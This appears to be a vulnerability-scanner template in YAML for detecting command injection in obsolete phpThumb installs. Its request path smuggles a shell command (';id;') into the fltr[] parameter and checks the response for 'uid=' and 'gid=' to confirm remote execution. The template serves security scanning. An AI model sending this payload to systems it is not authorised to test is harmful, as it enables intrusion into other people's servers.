http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - uid=
    - gid=
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg%20;id;%20&phpThumbDebug=9'
id: rce-phpthumb
info:
  author: reewardius
  metadata:
    max-request: 1
  name: Command Injection via Obsolete PHPThumb
  severity: critical
  tags: rce,php
